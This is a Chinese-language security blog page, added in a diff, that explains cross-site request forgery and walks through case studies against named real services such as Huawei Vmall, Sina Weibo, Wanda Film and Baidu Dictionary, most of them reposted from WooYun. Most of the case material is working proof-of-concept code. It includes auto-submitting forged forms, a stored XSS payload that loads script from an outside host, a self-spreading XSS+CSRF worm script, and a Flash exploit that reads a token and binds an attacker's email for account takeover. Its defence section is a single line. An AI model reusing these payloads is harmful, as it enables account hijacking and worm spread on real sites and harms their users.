@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-transform"/>
+
+
+    <title>
+      
+    [WEB安全]Cross-site request forgery - B1ueB0ne
+    
+    </title>
+
+
+  <link href="asset/css/style.css" rel="stylesheet" > 
+  <link href="asset/js/xcode.min.css" rel="stylesheet">
+  <script src="asset/js/headroom.js"></script>
+
+  <!-- <link rel="stylesheet" href="http://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="asset/css/font-awesome.css">
+ -->
+
+  <!-- <script src="asset/highlightjs/highlight.pack.js"></script> -->
+  <!-- <link href="asset/highlightjs/styles/solarized_light.css" media="screen, projection" rel="stylesheet" type="text/css"> -->
+  <!-- <script>hljs.initHighlightingOnLoad();</script> -->
+
+
+  </head>
+
+  <!-- 主体开始 -->
+  <!-- <body class="" gtools_scp_screen_capture_injected="true"> -->
+  <!-- 上面为主页白底色版本 -->
+    
+<body class="bg-grey" gtools_scp_screen_capture_injected="true" data-feedly-mini="yes">
+<!-- 上面是主页灰底色版本 -->
+
+<!--[if lt IE 8]>
+<div class="browsehappy" role="dialog">
+    当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank">升级你的浏览器</a>。
+</div>
+<![endif]-->
+<!-- 头部位置 -->
+
+<header id="header" class="header bg-white headroom">
+  <div class="navbar-container"> 
+    <a href="index.html" class="navbar-logo"><img src="asset/img/langu.JPG"> </a>
+    <div class="navbar-menu"> 
+
+        
+        <a href="index.html">Index</a>
+        
+        <a href="archives.html">Archives</a>
+        
+        <a href="about.html">About</a>
+        
+        
+    </div> 
+    <!-- 搜索框体 -->
+    <!--  <div class="navbar-search" onclick="">
+        <span class="icon-search"></span>
+        <form id="search" method="post" action="/" role="search">
+          <span class="search-box">
+            <input type="text" id="input" class="input" name="s" required="true" placeholder="Search..." maxlength="30" autocomplete="off">
+          </span>
+        </form>
+    </div> -->
+
+    <div class="navbar-mobile-menu" onclick=""> 
+      <span class="icon-menu cross"><span class="middle"></span></span> 
+        <ul> 
+          
+          <li>
+          <a href="index.html">Index</a>
+          </li>
+          
+          <li>
+          <a href="archives.html">Archives</a>
+          </li>
+          
+          <li>
+          <a href="about.html">About</a>
+          </li>
+          
+        </ul> 
+    </div> 
+  </div> 
+</header>
+<!-- 头部结束 --> <!-- post 开始 -->
+<div class="bg-white" gtools_scp_screen_capture_injected="true" data-feedly-mini="yes">
+	<article class="main-content page-page" style="max-width: 700px;padding: 110px 25px 20px" itemscope="" itemtype="http://schema.org/Article">
+		<div class="post-header">
+			<!-- title -->
+			<div class="post-header">
+				<h1 class="post-title itemprop="name headline">[WEB安全]Cross-site request forgery</h1>	
+				<div class="post-data">
+					<time datetime="2016-11-01T21:55:58+08:00" pubdate data-updated="true">2016/11/01</time>
+				</div>
+			</div>
+		</div>
+	<div id="post-content" class="post-content" itemprop="articleBody"> 
+		<p class="post-tags"> 
+		
+		<a href='WEB%E5%AE%89%E5%85%A8.html'>WEB安全</a>&nbsp;
+		
+		</p>
+	<!-- 正文 -->
+		<p>
+		<p>CSRF：<code>Cross-Site Request Forgery，跨站请求伪造</code></p>
+
+<span id="more"></span><!-- more -->
+
+<h3 id="toc_0">0x00 什么是CSRF</h3>
+
+<p>在OWASP中是这样说的</p>
+
+<pre><code class="language-text">一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求,包括该用户的会话cookie
+和其他认证信息,发送到一个存在漏洞的web应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求,而这些请求会被应用程序认为是用户的合法请求
+</code></pre>
+
+<h3 id="toc_1">0x01 CSRF攻击分类</h3>
+
+<ul>
+<li>GET</li>
+</ul>
+
+<pre><code class="language-text">请求是个GET请求，请求中没有token验证和referer验证，然后还有一个固定的变量可以被控制
+</code></pre>
+
+<ul>
+<li>POST</li>
+</ul>
+
+<pre><code class="language-text">请求是个POST请求，请求中没有token参数，也没有验证referer
+</code></pre>
+
+<ul>
+<li>POST-&gt;GET</li>
+</ul>
+
+<pre><code class="language-text">请求是个POST请求，请求中没有token参数，但是验证了referer。然而可以将post请求改写为get请求，然后通过第一种的情况进行利用
+</code></pre>
+
+<ul>
+<li>CSRF+XSS</li>
+</ul>
+
+<pre><code class="language-text">传说中的“黄金搭档”
+</code></pre>
+
+<ul>
+<li>FLASH CSRF</li>
+</ul>
+
+<pre><code class="language-text">Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF
+
+说真的，在学习这个之前还真不知道crossdomain.xml这个文件的作用
+</code></pre>
+
+<h3 id="toc_2">0x02 CSRF的主要危害</h3>
+
+<ul>
+<li><p>篡改目标网站上的用户数据</p></li>
+<li><p>盗取用户隐私数据</p></li>
+<li><p>作为其他攻击向量的辅助攻击手法</p></li>
+<li><p>传播CSRF蠕虫</p></li>
+</ul>
+
+<h3 id="toc_3">0x03 CSRF案例解析</h3>
+
+<ul>
+<li>#### 华为商城某处CSRF可修改安全邮箱</li>
+</ul>
+
+<p>漏洞点<code>http://www.vmall.com/member/updateEmail.json?email=xxxx@xxx.com</code></p>
+
+<p><img src="media/15190485582301/15190486321450.jpg" alt=""/></p>
+
+<p><img src="media/15190485582301/15190486387105.jpg" alt=""/></p>
+
+<p>然后就可以修改绑定邮箱，然后通过邮箱修改密码，登录帐号</p>
+
+<ul>
+<li>#### 新浪微博CSRF点链接关注</li>
+</ul>
+
+<p><img src="media/15190485582301/15190486493770.jpg" alt=""/></p>
+
+<p>这里uid可以是任意用户</p>
+
+<p>利用burp简单构造poc</p>
+
+<pre><code class="language-text">&lt;form action=&quot;http://movie.weibo.com/feed/relation/index/?fajtype=follow&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;1944519257&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+
+<ul>
+<li>#### 新浪微博CSRF之点我链接发微博</li>
+</ul>
+
+<p><img src="media/15190485582301/15190486616930.jpg" alt=""/></p>
+
+<p><img src="media/15190485582301/15190486683177.jpg" alt=""/></p>
+
+<p><a href="http://wanwan.sina.com.cn.llunull.tk/a.php">http://wanwan.sina.com.cn.llunull.tk/a.php</a></p>
+
+<p>此处构造poc</p>
+
+<pre><code class="language-text">&lt;form action=&quot;http://wanwan.sina.com.cn/t_sina/event/sxd.php&quot; method=&quot;get&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;e&quot; value=&quot;5&quot; /&gt;
+&lt;input type=&quot;text&quot; name=&quot;img&quot; value=&quot;http://wanwan.sina.com.cn.llunull.tk/sina_csrf.php&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;text&quot; value=&quot;hello,[email protected]://wanwan.sina.com.cn.llunull.tk/a.php&quot; /&gt;
+&lt;input type=&quot;text&quot; name=&quot;ra&quot; value=&quot;&quot;&gt;
+&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;
+&lt;/form&gt;
+</code></pre>
+
+<ul>
+<li>#### 某通用cms添加后台管理员的CSRF漏洞</li>
+</ul>
+
+<p>添加后台管理员请求如下：</p>
+
+<p><img src="media/15190485582301/15190486758847.png" alt=""/></p>
+
+<p>然后将post请求改成get也可以成功发包。</p>
+
+<p><code>http://127.0.0.1/asp/Survey/admin/Admin.asp?Username=test222&amp;Password1=123456&amp;Password2=123456&amp;action=yes</code></p>
+
+<ul>
+<li>#### 万达电影主站xss+csrf又是蠕虫</li>
+</ul>
+
+<p>电影的评论处存在存储型xss</p>
+
+<p>payload：<code>&lt;img src=x onerror=$[&#39;get\123cript&#39;](&#39;//20.rs&#39;) width=0&gt;</code></p>
+
+<p><img src="media/15190485582301/15190487212173.png" alt=""/></p>
+
+<p>CSRF的蠕虫代码</p>
+
+<pre><code class="language-text">var url=&quot;http://www.wandafilm.com/user/comment.do?m=addFilmComment&quot;;
+var sendata = &quot;filmId=20140507033232512405&amp;commentContent=%3Cimg+src%3Dx+onerror%3D%24%5B&#39;get\\123cript&#39;%5D(&#39;%2F%2Fkm3.pw&#39;)+width%3D0%3E&amp;cmType=0&amp;code=&quot;;
+if (window.XMLHttpRequest){
+var xmlhttp1=new XMLHttpRequest();
+}
+else{
+var xmlhttp1=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+}
+xmlhttp1.open(&quot;POST&quot;,url,true);
+xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp1.send(sendata);
+</code></pre>
+
+<p>filmId是想要蔓延过去的电影ID的值，只需要改变电影ID就可以实现蠕虫的蔓延，当然这只是测试了</p>
+
+<ul>
+<li>#### 百度某站可结合CSRF及XSS劫持账号</li>
+</ul>
+
+<p>在百度词典-我的词典处，有将生词添加进生词本的功能，在备注的时候没有进行过滤，可以直接插入JavaScript代码。</p>
+
+<p>一个“SELF-XSS”,只能跨自己，有什么用呢？</p>
+
+<p>考虑利用CSRF来触发这个XSS</p>
+
+<p>构造POC：</p>
+
+<pre><code class="language-text">#!html
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form id=&quot;baidu&quot; name=&quot;baidu&quot; action=&quot;http://dict.baidu.com/wordlist.php&quot; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;req&quot; value=&quot;add&quot; /&gt;
+        &lt;input type=&quot;text&quot; name=&quot;word&quot; value=&quot;Wooyun&quot; /&gt;
+        &lt;input type=&quot;text&quot; name=&quot;explain&quot; value=&quot;&lt;script src=http://xsserme&gt;&lt;/script&gt;&quot; /&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.baidu.submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>诱惑受害者访问该页面</p>
+
+<p>已经成功添加了一个新单词“Wooyun”</p>
+
+<p>代码成功执行</p>
+
+<p>[来源wooyun]</p>
+
+<ul>
+<li>#### flash csrf自动设置自己的密保邮箱</li>
+</ul>
+
+<p>当一个访客访问伪造链接的时候，自动设置自己的密保邮箱。</p>
+
+<p>申请保密邮箱，浏览器向服务端发送了一个POST请求，请求地址和参数为：<code>POST:xxx.xxx.xx/xx.jsp?userid=xxxx&amp;mail=dddd@dddd.com</code></p>
+
+<p>之前测试保密邮箱得知服务端没有验证Referer，但是页面验证了Token，所以就可以直接把POST数据包中的请求地址，参数名，参数值，Token值取出来用于伪造绑定保密邮箱的请求。</p>
+
+<p>利用代码：</p>
+
+<pre><code class="language-text">#!as3
+package {
+    import flash.display.Sprite;
+    import flash.events.Event;
+    import flash.net.*;
+    import flash.text.TextField;
+    public class url extends Sprite
+    {
+        public function url()
+        {
+            //获取当前页面userid/token
+            var echo_txt:TextField = new TextField();
+            var targetURL:String = &quot;http://xx.xx.cc&quot;;
+            var request:URLRequest = new URLRequest(targetURL);
+            request.method = URLRequestMethod.GET;
+            request.data = &quot;&quot;;
+            sendToURL(request);
+            var loader:URLLoader=new URLLoader();
+            loader.addEventListener(Event.COMPLETE,completeHandler);
+            function completeHandler(event:Event):void{
+            var userid:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?xxid=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];
+
+ var masthash:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?masthash=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];
+            echo_txt.text =  masthash;
+            //伪造申请密保邮箱POST请求
+            var emailtargetURL:String = &quot;http://xxxxxx.xx.cc/xxxx/xxxx.jsp?mark=send&quot;;
+            var emailrequest:URLRequest = new URLRequest(emailtargetURL);
+            emailrequest.method = URLRequestMethod.POST;
+            var postdata:Object = new Array();
+            postdata[0]=&quot;xxxx=xxxx@xxx.cc&amp;xxxx=&quot;+xxxxx&amp;&quot;xxxxx=&quot;+xxx;
+            emailrequest.data = postdata[0];
+            sendToURL(emailrequest);
+            }
+            loader.load(request);
+        }
+    }
+}
+</code></pre>
+
+<p>现在可以注册一个新邮箱测试一下了</p>
+
+<p>[来源wooyun]</p>
+
+<h3 id="toc_4">0x04 CSRF的防御</h3>
+
+<p>token校验</p>
+
+<h3 id="toc_5">0x05 CSRF总结</h3>
+
+<p>只要够猥琐，一个小洞也能上天</p>
+
+		</p>
+		<!-- 侧边导航条 -->
+		<div id="directory-content" class="directory-content">
+    		<div id="directory" style="margin-left: 50px;margin-top: 120px"></div>
+		</div>
+	<!-- JS -->
+	<script>
+		var postDirectoryBuild = function() {
+		    var postChildren = function children(childNodes, reg) {
+		        var result = [],
+		            isReg = typeof reg === 'object',
+		            isStr = typeof reg === 'string',
+		            node, i, len;
+		        for (i = 0, len = childNodes.length; i < len; i++) {
+		            node = childNodes[i];
+		            if ((node.nodeType === 1 || node.nodeType === 9) &&
+		                (!reg ||
+		                isReg && reg.test(node.tagName.toLowerCase()) ||
+		                isStr && node.tagName.toLowerCase() === reg)) {
+		                result.push(node);
+		            }
+		        }
+		        return result;
+		    },
+		    createPostDirectory = function(article, directory, isDirNum) {
+		        var contentArr = [],
+		            titleId = [],
+		            levelArr, root, level,
+		            currentList, list, li, link, i, len;
+		        levelArr = (function(article, contentArr, titleId) {
+		            var titleElem = postChildren(article.childNodes, /^h\d$/),
+		                levelArr = [],
+		                lastNum = 1,
+		                lastRevNum = 1,
+		                count = 0,
+		                guid = 1,
+		                id = 'directory' + (Math.random() + '').replace(/\D/, ''),
+		                lastRevNum, num, elem;
+		            while (titleElem.length) {
+		                elem = titleElem.shift();
+		                contentArr.push(elem.innerHTML);
+		                num = +elem.tagName.match(/\d/)[0];
+		                if (num > lastNum) {
+		                    levelArr.push(1);
+		                    lastRevNum += 1;
+		                } else if (num === lastRevNum ||
+		                    num > lastRevNum && num <= lastNum) {
+		                    levelArr.push(0);
+		                    lastRevNum = lastRevNum;
+		                } else if (num < lastRevNum) {
+		                    levelArr.push(num - lastRevNum);
+		                    lastRevNum = num;
+		                }
+		                count += levelArr[levelArr.length - 1];
+		                lastNum = num;
+		                elem.id = elem.id || (id + guid++);
+		                titleId.push(elem.id);
+		            }
+		            if (count !== 0 && levelArr[0] === 1) levelArr[0] = 0;
+
+		            return levelArr;
+		        })(article, contentArr, titleId);
+		        currentList = root = document.createElement('ul');
+		        dirNum = [0];
+		        for (i = 0, len = levelArr.length; i < len; i++) {
+		            level = levelArr[i];
+		            if (level === 1) {
+		                list = document.createElement('ul');
+		                if (!currentList.lastElementChild) {
+		                    currentList.appendChild(document.createElement('li'));
+		                }
+		                currentList.lastElementChild.appendChild(list);
+		                currentList = list;
+		                dirNum.push(0);
+		            } else if (level < 0) {
+		                level *= 2;
+		                while (level++) {
+		                    if (level % 2) dirNum.pop();
+		                    currentList = currentList.parentNode;
+		                }
+		            }
+		            dirNum[dirNum.length - 1]++;
+		            li = document.createElement('li');
+		            link = document.createElement('a');
+		            link.href = '#' + titleId[i];
+		            link.innerHTML = !isDirNum ? contentArr[i] :
+		                dirNum.join('.') + ' ' + contentArr[i] ;
+		            li.appendChild(link);
+		            currentList.appendChild(li);
+		        }
+		        directory.appendChild(root);
+		    };
+		    createPostDirectory(document.getElementById('post-content'),document.getElementById('directory'), true);
+		};
+		postDirectoryBuild();
+	</script>	
+	<!-- 版权声明 -->
+		<p class="post-info" style="color: #BCBDB6">
+				本文由 <a style="color: #BCBDB6" href="#">B1ueB0ne
+				</a> 创作，采用 <a style="color: #BCBDB6" href="https://creativecommons.org/licenses/by/4.0/" target="_blank" rel="external nofollow">知识共享署名4.0</a> 国际许可协议进行许可<br>本站文章除注明转载/出处外，均为本站原创或翻译，转载前请务必署名<br>最后编辑时间为: 2018-02-19T21:55:58+08:00
+		</p>
+	<!-- 导航 -->
+			<div id="comments" class="clearfix" style="padding: 0px;">
+				<footer class="post-footer clearfix">	    			
+				    <div class="meta">
+					    
+					    <P style="float: left;">
+					    	<a href="15190489343539.html" 
+					        title="Previous Post: [BugBountyTips]Local File Inclusion and Remote File Inclusion">&laquo; [BugBountyTips]Local File Inclusion and Remote File Inclusion</a>
+					    </p>
+					    <p style="float:right; ">
+					    	
+					    	
+					        <a href="15190487677628.html" 
+					        title="Next Post: [漏洞分析]Wordpress_Plugin_SinglePersonalMessage1.0.3 sql injection">[漏洞分析]Wordpress_Plugin_SinglePersonalMessage1.0.3 sql injection &raquo;</a>
+					    </p> 
+					    
+				    </div>
+			  	</footer>
+	<!-- footer end -->
+			</div>		
+	</div>
+</article>
+			<!-- 评论区 -->
+			<div id="respond-post-269" class="comment-container"> 
+				<div id="comments" class="clearfix">
+
+				<script type="text/javascript" src="/pm/hashover/hashover.js"></script>
+<noscript>You must have JavaScript enabled to use the comments.</noscript>
+
+<!-- 评论区结束 -->
+					<div>
+					
+					</div>
+
+				</div>
+			</div>
+</div>
+<!-- headroom -->
+<script type="text/javascript"> 
+(function() {
+    var header = new Headroom(document.querySelector("#header"), {
+        tolerance: 3,
+        offset : 80,
+        classes: {
+          initial: "animated",
+          pinned: "slideDown",
+          unpinned: "slideUp"
+        }
+    });
+    header.init();
+}());
+</script>  <footer id="footer" class="footer" style="background-color: #030501;color: #FFFFFE;">
+  <div class="footer-meta">
+    <div class="footer-container">
+      <!-- 版权说明 -->
+      <div class="meta-item meta-copyright">
+        <div class="meta-copyright-info">
+          <h2 class="meta-title">INFO</h2>
+          <div class="info-text">  
+              <p>Since 2016 <br>
+              <span class="credit">Hacked by 
+              <a target="_blank" href="https://www.uxss.net/">B1ueB0ne</a> 
+              </span>
+              <p>Theme Design by <a href="https://www.linpx.com/" target="_blank">Chakhsu</a></p>
+              <p>Migrating to Mweb by <a href="http://metaidea.cn">idken</a></p>
+              </p> 
+          </div>                  
+        </div>
+      </div>  
+      <!-- Categories -->
+      <div class="meta-item meta-comments">
+          <h2 class="meta-title">CATEGORIES</h2>  
+             
+            
+            <li>
+            <a href="WEB%E5%AE%89%E5%85%A8.html">WEB安全&nbsp;(8)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="JAVA%E5%AE%89%E5%85%A8.html">JAVA安全&nbsp;(10)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="PYTHON.html">PYTHON&nbsp;(2)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            <li>
+            <a href="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">漏洞分析&nbsp;(12)</a>
+            <p>
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+            
+            </p>
+            </li>
+            
+             
+      </div>
+      <!-- 最新文章 -->
+      <div class="meta-item meta-comments">
+          <h2 class="meta-title">RECENT POSTS</h2>
+
+          
+          
+         <li>
+           <a href="15982374410900.html">[胡思乱想]奔涌的后浪与独立思考</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982373638552.html">[胡思乱想]为什么我们会对新事物产生抵触心理</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982371852368.html">[IoT安全]2020 IoT Threat Report (简单解读)</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982371354139.html">[安全建设]应用安全评审中的三个关键节点及抓手实现</a><br>
+         </li>
+          
+          
+          
+         <li>
+           <a href="15982365857946.html">[JAVA安全]利用CodeQL寻找Java Deserialization Vulnerabilities</a><br>
+         </li>
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+           
+
+      </div>
+  </div>
+</div>
+</footer>
+
+<!--评论变量判断 -->
+      
+<!-- 评论end -->
+<script src="asset/chart/all-min.js"></script><script type="text/javascript">$(function(){    var mwebii=0;    var mwebChartEleId = 'mweb-chart-ele-';    $('pre>code').each(function(){        mwebii++;        var eleiid = mwebChartEleId+mwebii;        if($(this).hasClass('language-sequence')){            var ele = $(this).addClass('nohighlight').parent();            $('<div id="'+eleiid+'"></div>').insertAfter(ele);            ele.hide();            var diagram = Diagram.parse($(this).text());            diagram.drawSVG(eleiid,{theme: 'simple'});        }else if($(this).hasClass('language-flow')){            var ele = $(this).addClass('nohighlight').parent();            $('<div id="'+eleiid+'"></div>').insertAfter(ele);            ele.hide();            var diagram = flowchart.parse($(this).text());            diagram.drawSVG(eleiid);        }    });});</script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS_SVG-full"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({TeX: { equationNumbers: { autoNumber: "AMS" } }});</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?5cedc0509c3675ce7544f6ab75111536";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
